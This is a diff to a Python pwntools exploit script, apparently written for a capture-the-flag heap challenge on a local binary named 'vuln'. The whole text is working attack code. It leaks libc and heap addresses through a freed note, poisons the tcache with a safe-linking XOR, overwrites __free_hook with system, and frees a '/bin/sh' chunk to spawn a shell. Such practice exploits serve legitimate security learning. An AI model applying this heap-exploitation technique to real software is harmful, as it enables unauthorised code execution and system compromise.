@@ -5,7 +5,7 @@ from pwn import p64
 debug = 1
 gdb_is = 0
 # context(arch='i386',os = 'linux', log_level='DEBUG')
-context(arch='amd64',os = 'linux', log_level='DEBUG')
+context(arch='amd64',os = 'linux',log_level='DEBUG')
 if debug:
     context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
     r = process("./vuln")
@@ -39,8 +39,8 @@ def edit_note(page , content):
     r.sendafter(b'Content:' , content)
 
 def show_note(page):
-    r.sendlineafter(b'Exit',b'4')
-    r.sendlineafter(b'Index:', str(page).encode())
+    r.sendlineafter(b'>',b'4')
+    r.sendlineafter(b'Index: ', str(page).encode())
 
 for i in range(10):
     add_note(i,0x80)
@@ -51,22 +51,21 @@ delete_note(8)
 edit_note(8,b'a')
 show_note(8)
 
-libc_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) - 0x61 - 0x1e3c00
+libc_addr = u64(r.recv(6).ljust(8,b'\x00')) - 0x61 - 0x1e3c00
 print(f'libc_addr  = {hex(libc_addr)}')
 libc.address = libc_addr
 system_addr = libc.sym['system']
 free_hook = libc.sym['__free_hook']
 print(f'free_hook = {hex(free_hook)}')
 print(f'system_addr = {hex(system_addr)}')
-show_note(6)
-r.recv()
+
+show_note(0)
 heap=u64(r.recv(5)+b'\x00\x00\x00')
-edit_note(0,p64(free_hook ^ heap))
+edit_note(6,p64(free_hook ^ heap))
 print(f'heap = {hex(heap)}')
 print(f'free_hook ^ heap = {hex(free_hook ^ heap)}')
-
 add_note(10,0x80)
-edit_note(10,b'/bin/sh')
+edit_note(10,b'/bin/sh\x00')
 add_note(11,0x80)
 edit_note(11,p64(system_addr))
 delete_note(10)
